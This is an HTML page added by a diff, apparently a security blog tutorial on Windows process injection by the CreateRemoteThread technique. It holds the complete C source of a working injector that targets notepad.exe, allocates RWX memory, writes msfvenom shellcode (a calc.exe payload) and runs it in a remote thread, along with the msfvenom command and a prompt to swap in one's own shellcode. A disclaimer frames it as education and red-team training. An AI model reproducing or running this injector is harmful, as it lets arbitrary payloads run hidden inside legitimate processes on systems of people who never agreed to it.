@@ -1,0 +1,1168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Basic Process Injection — CreateRemoteThread Technique — Piyusha Akash</title>
+    <meta name="description" content="A complete code walkthrough of a classic CreateRemoteThread process injector in C — process enumeration, VirtualAllocEx, WriteProcessMemory, shellcode generation with msfvenom, and remote thread execution.">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&family=Fira+Code:wght@300;400;500;600&family=Newsreader:ital,opsz,wght@0,6..72,300;0,6..72,400;1,6..72,300;1,6..72,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/base16/tomorrow-night.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+
+    <style>
+        :root {
+            --acid:   #00ff9d;
+            --acid2:  #00e5ff;
+            --red:    #ff2d55;
+            --gold:   #f59e0b;
+            --orange: #f97316;
+            --bg:     #060608;
+            --bg2:    #0a0a0f;
+            --surface:  #0e0e16;
+            --surface2: #14141f;
+            --border:        rgba(0,255,157,0.10);
+            --border-bright: rgba(0,255,157,0.38);
+            --text:     #c8ccd8;
+            --text-dim: #555870;
+            --white:    #f0f2ff;
+            --prose-width: 760px;
+        }
+
+        *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+        html { scroll-behavior:smooth; }
+        body { background:var(--bg); color:var(--text); font-family:'Newsreader',Georgia,serif; overflow-x:hidden; cursor:none; }
+
+        .cursor { position:fixed; width:8px; height:8px; background:var(--acid); border-radius:50%; pointer-events:none; z-index:9999; transform:translate(-50%,-50%); box-shadow:0 0 12px var(--acid),0 0 30px rgba(0,255,157,.3); transition:transform .1s; }
+        .cursor-ring { position:fixed; width:32px; height:32px; border:1px solid rgba(0,255,157,.5); border-radius:50%; pointer-events:none; z-index:9998; transform:translate(-50%,-50%); transition:all .15s ease; }
+        body::before { content:''; position:fixed; inset:0; background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='1'/%3E%3C/svg%3E"); opacity:.022; pointer-events:none; z-index:1000; }
+        .grid-bg { position:fixed; inset:0; background-image:linear-gradient(rgba(0,255,157,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,157,.02) 1px,transparent 1px); background-size:60px 60px; pointer-events:none; }
+        .scanline { position:fixed; width:100%; height:1px; background:linear-gradient(90deg,transparent,rgba(0,255,157,.18) 50%,transparent); animation:scan 9s linear infinite; pointer-events:none; z-index:2; }
+        @keyframes scan { 0%{top:-1px} 100%{top:100%} }
+
+        nav { position:fixed; top:0; left:0; right:0; z-index:900; padding:16px 48px; display:flex; justify-content:space-between; align-items:center; background:rgba(6,6,8,.9); backdrop-filter:blur(24px); border-bottom:1px solid var(--border); }
+        .nav-logo { font-family:'Space Mono',monospace; font-size:14px; color:var(--acid); letter-spacing:.1em; text-decoration:none; }
+        .nav-logo span { color:var(--text-dim); }
+        .nav-right { display:flex; align-items:center; gap:24px; }
+        .nav-link { font-family:'Fira Code',monospace; font-size:11px; color:var(--text-dim); text-decoration:none; letter-spacing:.08em; transition:color .2s; }
+        .nav-link::before { content:'./'; color:var(--acid); opacity:.5; }
+        .nav-link:hover { color:var(--acid); }
+
+        #reading-progress { position:fixed; top:0; left:0; z-index:950; height:2px; width:0%; background:linear-gradient(90deg,var(--acid),var(--acid2)); transition:width .1s linear; box-shadow:0 0 8px rgba(0,255,157,.5); }
+
+        /* ── EXECUTION FLOW DIAGRAM ── */
+        .exec-flow {
+            background:var(--surface); border:1px solid var(--border);
+            padding:28px 32px; margin:32px 0;
+        }
+        .ef-title { font-family:'Fira Code',monospace; font-size:10px; color:var(--text-dim); letter-spacing:.2em; margin-bottom:20px; }
+        .ef-steps { display:flex; flex-direction:column; gap:0; }
+        .ef-step {
+            display:flex; align-items:center; gap:16px;
+            padding:14px 16px; border:1px solid var(--border);
+            background:var(--bg2); position:relative;
+            transition:all .25s;
+        }
+        .ef-step:hover { border-color:var(--border-bright); background:var(--surface2); }
+        .ef-arrow {
+            text-align:center; padding:6px 0;
+            font-family:'Fira Code',monospace; font-size:12px;
+            color:var(--text-dim); letter-spacing:.1em;
+        }
+        .ef-num { font-family:'Fira Code',monospace; font-size:11px; color:var(--acid); opacity:.5; min-width:32px; flex-shrink:0; }
+        .ef-api { font-family:'Fira Code',monospace; font-size:13px; color:var(--white); font-weight:600; }
+        .ef-desc { font-family:'Fira Code',monospace; font-size:11px; color:var(--text-dim); margin-top:2px; }
+        .ef-tag { font-family:'Fira Code',monospace; font-size:9px; padding:2px 8px; border:1px solid; margin-left:auto; flex-shrink:0; white-space:nowrap; }
+        .ef-tag-win32 { color:var(--acid2); border-color:rgba(0,229,255,.3); background:rgba(0,229,255,.06); }
+        .ef-tag-mem   { color:var(--orange); border-color:rgba(249,115,22,.3); background:rgba(249,115,22,.06); }
+        .ef-tag-exec  { color:var(--red); border-color:rgba(255,45,85,.3); background:rgba(255,45,85,.06); }
+
+        /* ── API REFERENCE BOX ── */
+        .api-ref {
+            background:var(--surface); border:1px solid var(--border);
+            border-left:3px solid var(--acid2);
+            margin:24px 0; overflow:hidden;
+        }
+        .api-ref-header {
+            background:rgba(0,229,255,.05); padding:10px 20px;
+            border-bottom:1px solid rgba(0,229,255,.1);
+            display:flex; align-items:center; gap:12px;
+            font-family:'Fira Code',monospace; font-size:10px; color:var(--acid2); letter-spacing:.15em;
+        }
+        .api-ref-header .api-name { font-size:13px; color:var(--white); font-weight:600; }
+        .api-ref-body { padding:16px 20px; }
+        .api-ref-sig {
+            font-family:'Fira Code',monospace; font-size:12px; color:var(--text);
+            background:var(--bg2); padding:12px 16px;
+            border:1px solid var(--border); margin-bottom:14px; overflow-x:auto;
+        }
+        .api-ref-sig .ret { color:var(--acid2); }
+        .api-ref-sig .fname { color:var(--white); font-weight:700; }
+        .api-ref-sig .param-name { color:var(--acid); }
+        .api-ref-sig .param-type { color:var(--text-dim); }
+        .api-params { width:100%; border-collapse:collapse; font-family:'Fira Code',monospace; font-size:11px; }
+        .api-params th { color:var(--acid); font-size:10px; letter-spacing:.12em; padding:8px 12px; border:1px solid var(--border); background:var(--surface2); text-align:left; }
+        .api-params td { padding:8px 12px; border:1px solid var(--border); color:var(--text); vertical-align:top; }
+        .api-params td:first-child { color:var(--acid); white-space:nowrap; }
+        .api-params td:nth-child(2) { color:var(--acid2); white-space:nowrap; }
+        .api-params tr:hover td { background:rgba(0,255,157,.02); }
+        .api-msdn {
+            display:inline-flex; align-items:center; gap:7px;
+            margin-top:12px; font-family:'Fira Code',monospace; font-size:10px;
+            color:var(--text-dim); text-decoration:none;
+            border:1px solid var(--border); padding:5px 14px;
+            transition:all .2s; letter-spacing:.06em;
+        }
+        .api-msdn:hover { border-color:var(--border-bright); color:var(--acid); background:rgba(0,255,157,.04); }
+
+        /* ── MSFVENOM BOX ── */
+        .msfvenom-box {
+            background:var(--surface); border:1px solid rgba(249,115,22,.25);
+            border-left:3px solid var(--orange);
+            margin:28px 0; overflow:hidden;
+        }
+        .msfvenom-header {
+            background:rgba(249,115,22,.06); padding:10px 20px;
+            border-bottom:1px solid rgba(249,115,22,.15);
+            font-family:'Fira Code',monospace; font-size:10px; color:var(--orange); letter-spacing:.15em;
+            display:flex; align-items:center; gap:10px;
+        }
+        .msfvenom-body { padding:16px 20px; }
+        .msfvenom-flag-table { width:100%; border-collapse:collapse; font-family:'Fira Code',monospace; font-size:12px; }
+        .msfvenom-flag-table th { color:var(--orange); font-size:10px; letter-spacing:.12em; padding:8px 12px; border:1px solid rgba(249,115,22,.2); background:var(--surface2); text-align:left; }
+        .msfvenom-flag-table td { padding:8px 12px; border:1px solid rgba(249,115,22,.15); color:var(--text); vertical-align:top; }
+        .msfvenom-flag-table td:first-child { color:var(--orange); white-space:nowrap; font-weight:600; }
+        .msfvenom-flag-table tr:hover td { background:rgba(249,115,22,.03); }
+
+        /* ── POST WRAP ── */
+        .post-wrap { max-width:var(--prose-width); margin:0 auto; padding:120px 24px 100px; position:relative; z-index:5; }
+
+        .post-header { margin-bottom:48px; }
+        .post-tags-top { display:flex; flex-wrap:wrap; gap:8px; margin-bottom:24px; }
+        .post-tag-top { font-family:'Fira Code',monospace; font-size:10px; padding:3px 12px; letter-spacing:.08em; border:1px solid; }
+        .post-title { font-family:'Syne',sans-serif; font-size:clamp(32px,4.5vw,54px); font-weight:800; line-height:1.0; letter-spacing:-.03em; color:var(--white); margin-bottom:20px; }
+        .post-meta-bar { display:flex; flex-wrap:wrap; align-items:center; gap:20px; font-family:'Fira Code',monospace; font-size:11px; color:var(--text-dim); padding:16px 0; border-top:1px solid var(--border); border-bottom:1px solid var(--border); margin-top:24px; }
+        .pm-item { display:flex; align-items:center; gap:7px; }
+        .pm-divider { color:var(--border-bright); }
+        .pm-author { color:var(--acid); }
+
+        /* ── TOC ── */
+        .toc { background:var(--surface); border:1px solid var(--border); border-left:3px solid var(--acid); padding:24px 28px; margin:36px 0; }
+        .toc-title { font-family:'Fira Code',monospace; font-size:11px; color:var(--acid); letter-spacing:.15em; margin-bottom:16px; }
+        .toc ol { list-style:none; counter-reset:toc-counter; }
+        .toc li { counter-increment:toc-counter; font-family:'Fira Code',monospace; font-size:12px; color:var(--text-dim); margin-bottom:10px; display:flex; align-items:flex-start; gap:10px; }
+        .toc li::before { content:counter(toc-counter,decimal-leading-zero) '.'; color:var(--acid); opacity:.6; flex-shrink:0; }
+        .toc a { color:var(--text-dim); text-decoration:none; transition:color .2s; line-height:1.5; }
+        .toc a:hover { color:var(--acid); }
+
+        /* ── PROSE ── */
+        .post-body { line-height:1.85; font-size:17px; font-weight:300; color:var(--text); }
+        .post-body h2 { font-family:'Syne',sans-serif; font-size:clamp(20px,2.8vw,28px); font-weight:800; color:var(--white); letter-spacing:-.02em; margin:60px 0 20px; padding-bottom:12px; border-bottom:1px solid var(--border); scroll-margin-top:90px; }
+        .post-body h2::before { content:'// '; color:var(--acid); opacity:.7; font-family:'Fira Code',monospace; font-size:.68em; }
+        .post-body h3 { font-family:'Syne',sans-serif; font-size:17px; font-weight:700; color:var(--white); margin:36px 0 14px; scroll-margin-top:90px; }
+        .post-body h3::before { content:'> '; color:var(--acid2); opacity:.6; font-family:'Fira Code',monospace; }
+        .post-body p { margin-bottom:22px; }
+        .post-body strong { color:var(--white); font-weight:600; }
+        .post-body em { font-style:italic; }
+        .post-body code { font-family:'Fira Code',monospace; font-size:.82em; color:var(--acid); background:rgba(0,255,157,.07); border:1px solid rgba(0,255,157,.15); padding:2px 7px; border-radius:2px; }
+        .post-body pre { margin:24px 0; border-radius:4px; overflow:hidden; border:1px solid var(--border); box-shadow:0 4px 24px rgba(0,0,0,.5); }
+        .post-body pre code { font-family:'Fira Code',monospace; font-size:12.5px; background:transparent; border:none; padding:0; color:inherit; line-height:1.65; }
+        .code-wrap { position:relative; }
+        .code-label { position:absolute; top:0; right:0; font-family:'Fira Code',monospace; font-size:10px; color:var(--text-dim); background:var(--surface2); padding:6px 14px; letter-spacing:.1em; z-index:1; border-left:1px solid var(--border); border-bottom:1px solid var(--border); }
+        .code-copy { position:absolute; top:0; left:0; font-family:'Fira Code',monospace; font-size:10px; color:var(--text-dim); background:transparent; padding:6px 14px; letter-spacing:.06em; z-index:1; border:none; cursor:pointer; transition:color .2s; }
+        .code-copy:hover { color:var(--acid); }
+        .post-body blockquote { border-left:3px solid var(--acid); background:rgba(0,255,157,.04); padding:18px 24px; margin:24px 0; font-style:italic; color:var(--text-dim); }
+        .post-body blockquote strong { color:var(--acid); font-style:normal; }
+        .post-body ul,.post-body ol { padding-left:28px; margin-bottom:22px; }
+        .post-body li { margin-bottom:8px; }
+        .post-body ul li::marker { color:var(--acid); }
+        .post-body ol li::marker { color:var(--acid); font-family:'Fira Code',monospace; font-size:.85em; }
+        .post-body hr { border:none; border-top:1px solid var(--border); margin:48px 0; }
+        .post-body a { color:var(--acid); text-decoration:underline; text-decoration-color:rgba(0,255,157,.3); text-underline-offset:3px; transition:text-decoration-color .2s; }
+        .post-body a:hover { text-decoration-color:var(--acid); }
+        .post-body table { width:100%; border-collapse:collapse; margin:24px 0; font-size:13px; font-family:'Fira Code',monospace; }
+        .post-body th { background:var(--surface); color:var(--acid); padding:11px 16px; text-align:left; border:1px solid var(--border); font-size:10px; letter-spacing:.12em; }
+        .post-body td { padding:10px 16px; border:1px solid var(--border); color:var(--text); }
+        .post-body tr:hover td { background:rgba(0,255,157,.02); }
+
+        /* callouts */
+        .callout { padding:18px 22px; margin:24px 0; border-left:3px solid; font-family:'Fira Code',monospace; font-size:12.5px; line-height:1.7; }
+        .callout-title { font-weight:700; letter-spacing:.12em; margin-bottom:8px; font-size:10px; }
+        .callout-info   { border-color:var(--acid2); background:rgba(0,229,255,.05); }
+        .callout-info   .callout-title { color:var(--acid2); }
+        .callout-warn   { border-color:var(--gold); background:rgba(245,158,11,.05); }
+        .callout-warn   .callout-title { color:var(--gold); }
+        .callout-danger { border-color:var(--red); background:rgba(255,45,85,.05); }
+        .callout-danger .callout-title { color:var(--red); }
+        .callout-tip    { border-color:var(--acid); background:rgba(0,255,157,.05); }
+        .callout-tip    .callout-title { color:var(--acid); }
+        .callout-shell  { border-color:var(--orange); background:rgba(249,115,22,.05); }
+        .callout-shell  .callout-title { color:var(--orange); }
+
+        /* step badge — numbered section markers */
+        .step-badge {
+            display:inline-flex; align-items:center; gap:10px;
+            font-family:'Fira Code',monospace; font-size:11px;
+            color:var(--acid); background:rgba(0,255,157,.07);
+            border:1px solid rgba(0,255,157,.25);
+            padding:4px 16px; margin-bottom:16px; letter-spacing:.1em;
+        }
+        .step-badge .sn { font-size:16px; font-family:'Syne',sans-serif; font-weight:800; }
+
+        /* post footer */
+        .post-footer { margin-top:72px; padding-top:40px; border-top:1px solid var(--border); }
+        .pf-label { font-family:'Fira Code',monospace; font-size:10px; color:var(--text-dim); letter-spacing:.2em; margin-bottom:20px; }
+        .pf-tags { display:flex; flex-wrap:wrap; gap:10px; margin-bottom:40px; }
+        .pf-tag { font-family:'Fira Code',monospace; font-size:11px; padding:6px 14px; border:1px solid; text-decoration:none; transition:all .2s; border-radius:1px; }
+        .pf-back { display:inline-flex; align-items:center; gap:10px; font-family:'Fira Code',monospace; font-size:12px; color:var(--text-dim); text-decoration:none; border:1px solid var(--border); padding:12px 24px; letter-spacing:.1em; transition:all .3s; }
+        .pf-back:hover { border-color:var(--border-bright); color:var(--acid); background:rgba(0,255,157,.04); }
+        .pf-back::before { content:'←'; color:var(--acid); opacity:.7; }
+
+        #particles-canvas { position:fixed; inset:0; pointer-events:none; z-index:1; opacity:.22; }
+
+        @media(max-width:600px) {
+            nav { padding:14px 20px; }
+            .post-wrap { padding:100px 20px 80px; }
+            .post-title { font-size:clamp(28px,9vw,44px); }
+            .post-body { font-size:15.5px; }
+            .exec-flow .ef-steps { gap:2px; }
+            .api-ref-sig { font-size:11px; }
+        }
+    </style>
+</head>
+<body>
+
+<div id="reading-progress"></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+<canvas id="particles-canvas"></canvas>
+<div class="grid-bg"></div>
+<div class="scanline"></div>
+
+<nav>
+    <a href="../../" class="nav-logo">[<span>0x3xp</span>] <span style="color:var(--text-dim)">~</span></a>
+    <div class="nav-right">
+        <a href="../" class="nav-link">blog</a>
+        <a href="../../#projects" class="nav-link">projects</a>
+        <a href="../../" class="nav-link">home</a>
+    </div>
+</nav>
+
+<article class="post-wrap">
+
+    <header class="post-header">
+        <div class="post-tags-top" id="post-tags-top"></div>
+        <h1 class="post-title" id="post-title">Basic Process Injection — CreateRemoteThread Technique</h1>
+        <div class="post-meta-bar">
+            <span class="pm-item pm-author">Piyusha Akash</span>
+            <span class="pm-divider">·</span>
+            <span class="pm-item" id="pm-date">DATE</span>
+            <span class="pm-divider">·</span>
+            <span class="pm-item" id="pm-read">READ TIME</span>
+            <span class="pm-divider">·</span>
+            <span class="pm-item">
+                <svg width="12" height="12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
+                &nbsp;reading
+            </span>
+        </div>
+    </header>
+
+    <!-- TOC -->
+    <div class="toc">
+        <div class="toc-title">// TABLE OF CONTENTS</div>
+        <ol>
+            <li><a href="#intro">What Is Process Injection?</a></li>
+            <li><a href="#full-source">Full Source Code</a></li>
+            <li><a href="#headers">Headers & Includes</a></li>
+            <li><a href="#step1">Step 1 — Process Enumeration with Toolhelp32</a></li>
+            <li><a href="#step2">Step 2 — Opening the Target Process</a></li>
+            <li><a href="#step3">Step 3 — Allocating Remote Memory with VirtualAllocEx</a></li>
+            <li><a href="#step4">Step 4 — Generating Shellcode with msfvenom</a></li>
+            <li><a href="#step5">Step 5 — Writing Shellcode with WriteProcessMemory</a></li>
+            <li><a href="#step6">Step 6 — Executing via CreateRemoteThread</a></li>
+            <li><a href="#compile">Compiling with GCC / MinGW</a></li>
+            <li><a href="#detection">Detection & Blue Team Notes</a></li>
+            <li><a href="#next">What Comes Next</a></li>
+        </ol>
+    </div>
+
+    <div class="post-body">
+
+        <!-- ═══════════════════════════════════════════ -->
+        <h2 id="intro">What Is Process Injection?</h2>
+
+        <p>
+            Process injection is a technique where an attacker writes and executes code inside the memory space of another running process. Instead of starting a new malicious process — which is noisy and easily detected — the shellcode lives inside a legitimate one. To a process list, to an AV scanner, to a casual analyst, it looks like <code>notepad.exe</code> is just running. Nothing suspicious.
+        </p>
+
+        <p>
+            The technique covered here is the most foundational form: <strong>CreateRemoteThread injection</strong>. It uses four Win32 API calls in sequence to accomplish the entire attack. Understand this one deeply and every more advanced injection variant (APC injection, early bird, thread hijacking, process hollowing) will make immediate sense — they're all solving the same problem with different levels of stealth.
+        </p>
+
+        <!-- execution flow diagram -->
+        <div class="exec-flow">
+            <div class="ef-title">// CREATEREMOTETHREAD INJECTION — EXECUTION FLOW</div>
+            <div class="ef-steps">
+                <div class="ef-step">
+                    <span class="ef-num">01 //</span>
+                    <div>
+                        <div class="ef-api">CreateToolhelp32Snapshot + Process32Next</div>
+                        <div class="ef-desc">Walk the process list to find target PID</div>
+                    </div>
+                    <span class="ef-tag ef-tag-win32">ENUM</span>
+                </div>
+                <div class="ef-arrow">↓</div>
+                <div class="ef-step">
+                    <span class="ef-num">02 //</span>
+                    <div>
+                        <div class="ef-api">OpenProcess(PROCESS_ALL_ACCESS)</div>
+                        <div class="ef-desc">Acquire handle with full permissions to target</div>
+                    </div>
+                    <span class="ef-tag ef-tag-win32">HANDLE</span>
+                </div>
+                <div class="ef-arrow">↓</div>
+                <div class="ef-step">
+                    <span class="ef-num">03 //</span>
+                    <div>
+                        <div class="ef-api">VirtualAllocEx(PAGE_EXECUTE_READWRITE)</div>
+                        <div class="ef-desc">Allocate RWX memory inside the target process</div>
+                    </div>
+                    <span class="ef-tag ef-tag-mem">MEMORY</span>
+                </div>
+                <div class="ef-arrow">↓</div>
+                <div class="ef-step">
+                    <span class="ef-num">04 //</span>
+                    <div>
+                        <div class="ef-api">WriteProcessMemory</div>
+                        <div class="ef-desc">Copy shellcode bytes into the allocated region</div>
+                    </div>
+                    <span class="ef-tag ef-tag-mem">WRITE</span>
+                </div>
+                <div class="ef-arrow">↓</div>
+                <div class="ef-step">
+                    <span class="ef-num">05 //</span>
+                    <div>
+                        <div class="ef-api">CreateRemoteThread</div>
+                        <div class="ef-desc">Spawn a thread in the target at the shellcode address</div>
+                    </div>
+                    <span class="ef-tag ef-tag-exec">EXECUTE</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="callout callout-danger">
+            <div class="callout-title">// DISCLAIMER</div>
+            This post is written for educational purposes — malware research, red team training, and defensive understanding. All code must be tested only in isolated lab environments with no network access. Never run against systems you do not own or have written permission to test.
+        </div>
+
+        <!-- ═══════════════════════════════════════════ -->
+        <h2 id="full-source">Full Source Code</h2>
+
+        <p>
+            Before breaking it down piece by piece, here is the complete program. Read through it once, then follow the step-by-step breakdown below.
+        </p>
+
+        <div class="code-wrap">
+            <span class="code-label">C — basic-process-injector.c</span>
+            <button class="code-copy" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tlhelp32.h&gt;
+
+int main(){
+
+    const char* TargetProcess = "notepad.exe";
+    DWORD dwPID = 0;
+    HANDLE hProcess = NULL;
+
+    /* ── STEP 1: Process enumeration ── */
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if(Process32First(hSnap, &pe32)) {
+        do {
+            if(_stricmp(pe32.szExeFile, TargetProcess) == 0) {
+                dwPID = pe32.th32ProcessID;
+                break;
+            }
+        } while(Process32Next(hSnap, &pe32));
+    }
+    CloseHandle(hSnap);
+
+    if(dwPID == 0) { printf("No process found!\n"); return 1; }
+
+    /* ── STEP 2: Open the target process ── */
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+    if(hProcess == NULL) {
+        printf("Error opening process: %lu\n", GetLastError());
+        return 1;
+    }
+    printf("[+] PID found: %lu | Handle: %p\n", dwPID, hProcess);
+
+    /* ── STEP 3: Allocate RWX memory in the target ── */
+    SIZE_T PayloadSize = 1024;
+    LPVOID RemoteBuffer = VirtualAllocEx(
+        hProcess, NULL, PayloadSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    if(RemoteBuffer == NULL) {
+        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
+        CloseHandle(hProcess); return 1;
+    }
+    printf("[+] Allocated remote buffer at: %p\n", RemoteBuffer);
+
+    /* ── STEP 4: Shellcode ──
+       Generated with:
+       msfvenom -p windows/exec CMD=calc.exe -b '\x00' -f c
+       Replace this payload with your own generated shellcode. */
+    const char* MyPayload =
+        "\xdb\xcb\xbd\xed\xb4\x88\xce\xd9\x74\x24\xf4\x5a\x29\xc9"
+        "\xb1\x31\x31\x6a\x18\x03\x6a\x18\x83\xc2\xe9\x56\x7d\x32"
+        "\x19\x14\x7e\xcb\xd9\x79\xf6\x2e\xe8\xb9\x6c\x3a\x5a\x0a"
+        "\xe6\x6e\x56\xe1\xaa\x9a\xed\x87\x62\xac\x46\x2d\x55\x83"
+        "\x57\x1e\xa5\x82\xdb\x5d\xfa\x64\xe2\xad\x0f\x64\x23\xd3"
+        "\xe2\x34\xfc\x9f\x51\xa9\x89\xea\x69\x42\xc1\xfb\xe9\xb7"
+        "\x91\xfa\xd8\x69\xaa\xa4\xfa\x88\x7f\xdd\xb2\x92\x9c\xd8"
+        "\x0d\x28\x56\x96\x8f\xf8\xa7\x57\x23\xc5\x08\xaa\x3d\x01"
+        "\xae\x55\x48\x7b\xcd\xe8\x4b\xb8\xac\x36\xd9\x5b\x16\xbc"
+        "\x79\x80\xa7\x11\x1f\x43\xab\xde\x6b\x0b\xaf\xe1\xb8\x27"
+        "\xcb\x6a\x3f\xe8\x5a\x28\x64\x2c\x07\xea\x05\x75\xed\x5d"
+        "\x39\x65\x4e\x01\x9f\xed\x62\x56\x92\xaf\xe8\xa9\x20\xca"
+        "\x5e\xa9\x3a\xd5\xce\xc2\x0b\x5e\x81\x95\x93\xb5\xe6\x6a"
+        "\xde\x94\x4e\xe3\x87\x4c\xd3\x6e\x38\xbb\x17\x97\xbb\x4e"
+        "\xe7\x6c\xa3\x3a\xe2\x29\x63\xd6\x9e\x22\x06\xd8\x0d\x42"
+        "\x03\xbb\xd0\xd0\xcf\x12\x77\x51\x75\x6b";
+
+    SIZE_T SizeofShellcode = strlen(MyPayload) + 1;
+
+    /* ── STEP 5: Write shellcode into remote memory ── */
+    BOOL isWritten = WriteProcessMemory(
+        hProcess, RemoteBuffer, MyPayload, SizeofShellcode, NULL);
+
+    if(!isWritten) {
+        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
+        CloseHandle(hProcess); return 1;
+    }
+    printf("[+] Shellcode written successfully!\n");
+
+    /* ── STEP 6: Create remote thread to execute shellcode ── */
+    HANDLE hThread = CreateRemoteThread(
+        hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)RemoteBuffer,
+        NULL, 0, NULL);
+
+    if(hThread == NULL) {
+        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
+    } else {
+        printf("[+] Remote thread executing shellcode...\n");
+        WaitForSingleObject(hThread, INFINITE);
+        CloseHandle(hThread);
+    }
+
+    CloseHandle(hProcess);
+    return 0;
+}</code></pre>
+        </div>
+
+        <!-- ═══════════════════════════════════════════ -->
+        <h2 id="headers">Headers & Includes</h2>
+
+        <div class="code-wrap">
+            <span class="code-label">C</span>
+            <button class="code-copy" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tlhelp32.h&gt;</code></pre>
+        </div>
+
+        <p>
+            Every Win32 API used in this program flows through these four headers. Understanding what each one provides saves you from link errors and confusing compiler warnings.
+        </p>
+
+        <table>
+            <thead><tr><th>Header</th><th>Provides</th></tr></thead>
+            <tbody>
+                <tr><td><code>windows.h</code></td><td>The master Win32 header. Pulls in <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>CreateRemoteThread</code>, all type definitions (<code>HANDLE</code>, <code>DWORD</code>, <code>LPVOID</code>, etc.) and constants (<code>PROCESS_ALL_ACCESS</code>, <code>PAGE_EXECUTE_READWRITE</code>, <code>MEM_COMMIT</code>).</td></tr>
+                <tr><td><code>string.h</code></td><td>Provides <code>strlen()</code> — used to measure shellcode length — and <code>_stricmp()</code> for case-insensitive process name comparison.</td></tr>
+                <tr><td><code>stdio.h</code></td><td>Standard I/O for <code>printf()</code> debug output.</td></tr>
+                <tr><td><code>tlhelp32.h</code></td><td>The <strong>Tool Help Library</strong>. Defines <code>CreateToolhelp32Snapshot</code>, <code>Process32First</code>, <code>Process32Next</code>, and the <code>PROCESSENTRY32</code> structure. Without this header, process enumeration is unavailable.</td></tr>
+            </tbody>
+        </table>
+
+        <!-- ═══════════════════════════════════════════ -->
+        <h2 id="step1">Step 1 — Process Enumeration with Toolhelp32</h2>
+
+        <div class="step-badge"><span class="sn">01</span> FIND THE TARGET PID</div>
+
+        <p>
+            Before you can inject into a process you need its <strong>Process ID (PID)</strong> — the numeric identifier the kernel uses to track it. Windows doesn't give you a direct "find process by name" API, so the standard approach is to take a <em>snapshot</em> of the entire process list and walk through it.
+        </p>
+
+        <div class="code-wrap">
+            <span class="code-label">C</span>
+            <button class="code-copy" onclick="copyCode(this)">copy</button>
+            <pre><code class="language-c">const char* TargetProcess = "notepad.exe";
+DWORD dwPID = 0;
+
+// Take a snapshot of all running processes at this moment in time
+HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+// PROCESSENTRY32 holds info for one process: PID, parent PID, exe name, etc.
+PROCESSENTRY32 pe32;
+pe32.dwSize = sizeof(PROCESSENTRY32);  // MUST be set before calling Process32First
+
+if(Process32First(hSnap, &pe32)) {
+    do {
+        // Case-insensitive compare: "notepad.exe" == "Notepad.EXE" → true
+        if(_stricmp(pe32.szExeFile, TargetProcess) == 0) {
+            dwPID = pe32.th32ProcessID;
+            break;
+        }
+    } while(Process32Next(hSnap, &pe32));
+}
+CloseHandle(hSnap);  // Always close the snapshot handle</code></pre>
+        </div>
+
+        <h3>What is a snapshot?</h3>
+
+        <p>
+            <code>CreateToolhelp32Snapshot</code> asks the kernel for a frozen copy of process/thread/module state at that exact moment. Think of it as a photograph of the process list. The flag <code>TH32CS_SNAPPROCESS</code> tells it we only want the process table — there are equivalent flags for threads (<code>TH32CS_SNAPTHREAD</code>) and loaded modules (<code>TH32CS_SNAPMODULE</code>).
+        </p>
+
+        <p>
+            The <code>PROCESSENTRY32</code> structure is critical — and the <code>dwSize</code> field must be initialized to <code>sizeof(PROCESSENTRY32)</code> <em>before</em> calling <code>Process32First</code>. This is a common Win32 pattern where the API uses the size field to version-check the structure. Forgetting it causes an immediate <code>ERROR_INSUFFICIENT_BUFFER</code> failure.
+        </p>
+
+        <!-- API Reference: CreateToolhelp32Snapshot -->
+        <div class="api-ref">
+            <div class="api-ref-header">
+                <span>WIN32 API</span>
+                <span class="api-name">CreateToolhelp32Snapshot</span>
+            </div>
+            <div class="api-ref-body">
+                <div class="api-ref-sig">
+                    <span class="ret">HANDLE</span> <span class="fname">CreateToolhelp32Snapshot</span>(<br>
+                    &nbsp;&nbsp;<span class="param-type">DWORD</span> <span class="param-name">dwFlags</span>,<br>
+                    &nbsp;&nbsp;<span class="param-type">DWORD</span> <span class="param-name">th32ProcessID</span><br>
